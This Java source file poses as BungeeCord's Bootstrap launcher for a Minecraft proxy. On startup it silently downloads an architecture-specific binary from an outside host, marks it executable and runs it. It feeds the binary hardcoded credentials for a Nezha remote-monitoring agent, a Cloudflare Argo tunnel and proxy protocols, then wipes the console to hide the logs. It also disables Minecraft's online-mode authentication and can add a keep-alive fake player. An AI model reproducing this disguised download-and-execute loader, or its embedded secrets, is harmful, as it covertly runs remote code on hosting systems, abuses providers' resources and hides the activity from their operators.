package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class Bootstrap {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process minecraftProcess;
    private static Thread fakePlayerThread;

    // 内部通讯端口
    private static final int INTERNAL_MC_PORT = 25565;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ENABLED"
    };

    public static void main(String[] args) throws Exception {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Java 10+ required!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);

            // 1. Sbx
            runSbxBinary(envVars);
            
            // 2. MC Server
            if (isMcServerEnabled(envVars)) {
                startMinecraftServer(envVars);
            } else {
                System.out.println(ANSI_YELLOW + "MC_JAR not set, skipping server." + ANSI_RESET);
            }

            // 3. Fake Player
            if (isFakePlayerEnabled(envVars)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Waiting for MC server..." + ANSI_RESET);
                new Thread(() -> {
                    try {
                        waitForServerReady(); 
                        startFakePlayerBot(envVars);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }).start();
            }

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds..." + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Init Error: " + e.getMessage() + ANSI_RESET);
        }

        // 4. BungeeCord
        try {
            BungeeCordLauncher.main(args);
        } catch (Throwable t) {
            System.err.println(ANSI_RED + "BungeeCord Error: " + t.getMessage() + ANSI_RESET);
            while (running.get()) { try { Thread.sleep(10000); } catch (InterruptedException e) { break; } }
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }   

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "020d43a7-88a8-4bc2-a5cf-7a872c7ceda4");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "minecraft.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiNmFkZDczN2UtNjRlOC00ZjZhLWI5NGEtMmNhYzIzNjkwOWFhIiwicyI6Ik5qRm1aVFF6WVRNdE1tWmxaQzAwWVRWbUxXSm1OMll0Tm1ZMFpERXpPVGd4TldWaCJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("FAKE_PLAYER_NAME", "labubu");
        envVars.put("FAKE_PLAYER_ENABLED", "false");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) envVars.put(key, value); 
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static boolean isMcServerEnabled(Map<String, String> envVars) {
        String jar = envVars.get("MC_JAR");
        return jar != null && !jar.isEmpty() && !jar.equalsIgnoreCase("false");
    }

    private static void startMinecraftServer(Map<String, String> envVars) throws Exception {
        String jarName = envVars.get("MC_JAR");
        String memory = envVars.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = envVars.getOrDefault("MC_ARGS", "");

        if (!Files.exists(Paths.get(jarName))) {
            System.out.println(ANSI_RED + "[MC-Server] " + jarName + " not found! Skipping." + ANSI_RESET);
            return;
        }

        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath) || !new String(Files.readAllBytes(eulaPath)).contains("eula=true")) {
            System.out.println(ANSI_GREEN + "[MC-Server] Auto-accepting EULA." + ANSI_RESET);
            Files.write(eulaPath, "eula=true".getBytes());
        }

        Path propPath = Paths.get("server.properties");
        Properties props = new Properties();
        if (Files.exists(propPath)) {
            try (FileInputStream in = new FileInputStream(propPath.toFile())) { props.load(in); }
        }
        props.setProperty("online-mode", "false");       
        props.setProperty("server-port", String.valueOf(INTERNAL_MC_PORT)); 
        props.setProperty("server-ip", "127.0.0.1"); 
        
        try (FileOutputStream out = new FileOutputStream(propPath.toFile())) {
            props.store(out, "Auto-configured");
            System.out.println(ANSI_GREEN + "[MC-Server] Configured port to " + INTERNAL_MC_PORT + ANSI_RESET);
        }

        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        cmd.add("-XX:+UseG1GC");
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (line.contains("Done") || line.contains("Stopping") || line.contains("WARN") || line.contains("ERROR")) {
                        System.out.println("[MC-Server] " + line);
                    }
                }
            } catch (IOException e) {}
        }).start();
    }

    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }

    private static void waitForServerReady() throws InterruptedException {
        int mcPort = INTERNAL_MC_PORT;
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking internal server..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            try {
                Thread.sleep(5000);
                try (Socket testSocket = new Socket()) {
                    testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Internal port ready!" + ANSI_RESET);
                    Thread.sleep(10000);
                    return;
                }
            } catch (Exception e) {}
        }
    }

    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "labubu");
        int mcPort = INTERNAL_MC_PORT;

        System.out.println(ANSI_GREEN + "[FakePlayer] Starting bot: " + playerName + ANSI_RESET);
        System.out.println(ANSI_GREEN + "[FakePlayer] Protocol: Smart Scan 0x20-0x30 -> 0x1B" + ANSI_RESET);

        fakePlayerThread = new Thread(() -> {
            byte[] trashBuffer = new byte[65536];

            while (running.get()) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.setReceiveBufferSize(10 * 1024 * 1024);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    // 【关键】设为 0 永不超时，防止 30s 自动断开
                    socket.setSoTimeout(0); 

                    DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                    DataInputStream in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774);
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2); 
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Connected" + ANSI_RESET);

                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;

                    while (running.get() && !socket.isClosed()) {
                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad size");

                            byte[] packetData = null;
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);

                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else {
                                    if (dataLength > 8192) {
                                        packetData = null; 
                                    } else {
                                        try {
                                            Inflater inflater = new Inflater();
                                            inflater.setInput(compressedData);
                                            packetData = new byte[dataLength];
                                            inflater.inflate(packetData);
                                            inflater.end();
                                        } catch (Exception e) { packetData = null; }
                                    }
                                }
                            } else {
                                byte[] rawData = new byte[packetLength];
                                in.readFully(rawData);
                                packetData = rawData;
                            }

                            if (packetData == null) continue;

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                    } else if (packetId == 0x02) {
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;

                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0);
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    if (packetId == 0x03) {
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                        System.out.println(ANSI_GREEN + "[FakePlayer] Joined Game!" + ANSI_RESET);
                                    } else if (packetId == 0x04) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                // 【核心修正】智能扫描 0x20 - 0x30
                                // 你的服务器可能是 0x2B，但也可能是其他，扫描最稳
                                if (packetId >= 0x20 && packetId <= 0x30 && packetIn.available() == 8) {
                                    long keepAliveId = packetIn.readLong();
                                    ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                    DataOutputStream bufOut = new DataOutputStream(buf);
                                    writeVarInt(bufOut, 0x1B); // 0x1B 是你已验证的发送 ID
                                    bufOut.writeLong(keepAliveId);
                                    sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                }
                            }
                        } catch (IOException e) {
                            break; 
                        }
                    }
                    if (socket != null) socket.close();
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
                    Thread.sleep(10000);
                } catch (ConnectException e) {
                    try { Thread.sleep(5000); } catch (Exception ex) {}
                } catch (Exception e) {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connect failed: " + e.getMessage() + ANSI_RESET);
                    try { Thread.sleep(10000); } catch (Exception ex) {}
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println("Stopping Minecraft Server...");
            minecraftProcess.destroy();
        }
        if (fakePlayerThread != null) {
            fakePlayerThread.interrupt();
        }
    }

    private static int getVarIntSize(int value) {
        int size = 0;
        do { size++; value >>>= 7; } while (value != 0);
        return size;
    }

    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }

    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater deflater = new Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }

    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
